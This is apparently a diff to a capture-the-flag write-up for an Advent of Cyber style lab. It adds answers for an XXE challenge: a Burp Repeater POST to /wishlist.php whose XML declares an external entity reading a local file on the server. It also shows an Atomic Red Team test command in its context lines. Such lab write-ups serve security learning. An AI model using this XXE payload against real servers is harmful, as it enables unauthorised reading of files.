@@ -131,3 +131,23 @@ Execute the test which should print a PDF containing the flag:
 ```powershell
 Invoke-AtomicTest T1059.003 -TestNumbers 4
 ```
+
+## XXE - Day 5: SOC-mas XX-what-ee?
+
+**What is the flag discovered after navigating through the wishes?**
+
+POST /wishlist.php using Burp Repeater:
+```xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_15.txt"> ]>
+<wishlist>
+  <user_id>1</user_id>
+     <item>
+       <product_id>&payload;</product_id>
+     </item>
+</wishlist>
+```
+
+**What is the flag seen on the possible proof of sabotage?**
+
+Go to http://MACHINE_IP/CHANGELOG
